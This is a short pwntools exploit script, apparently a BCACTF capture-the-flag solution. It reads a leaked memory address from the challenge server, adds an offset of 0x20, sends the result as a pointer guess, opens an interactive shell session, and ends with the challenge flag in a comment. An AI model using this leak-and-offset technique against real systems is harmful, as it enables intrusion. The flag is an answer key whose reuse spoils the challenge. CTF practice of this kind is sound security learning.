#!/usr/bin/python3

from pwn import *

r = remote('challs.bcactf.com', 30810)
r.recvuntil(b'in is ')
leak = int(r.recvline().strip(), 16)

log.info(f"leak {hex(leak)}")

pointer = hex(leak+0x20).encode('ascii')
print(pointer)
r.sendlineafter(b"guess>", pointer)

r.interactive()

#bcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}